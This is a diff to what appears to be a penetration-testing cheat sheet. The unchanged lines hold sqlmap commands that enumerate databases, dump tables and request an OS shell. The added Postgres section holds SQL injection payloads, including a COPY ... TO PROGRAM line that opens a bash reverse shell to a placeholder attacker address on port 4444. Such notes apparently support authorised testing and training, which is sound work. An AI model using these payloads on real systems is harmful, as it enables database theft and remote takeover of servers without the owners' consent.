@@ -412,6 +412,11 @@ sqlmap -u "http://<IP>/page.php?id=1" -p id --dbs
 sqlmap -u "http://<IP>/page.php?id=1" -p id -D <db> --tables
 sqlmap -u "http://<IP>/page.php?id=1" -p id -D <db> -T <table> --dump
 sqlmap -r burp_request.txt -p <param> --os-shell --web-root "/var/www/html/tmp"
+
+# Postgres
+' UNION SELECT '1',current_user,'3','4','5'-- //
+'; SELECT 1-- //
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'-- //
 ```
 
 ### XSS
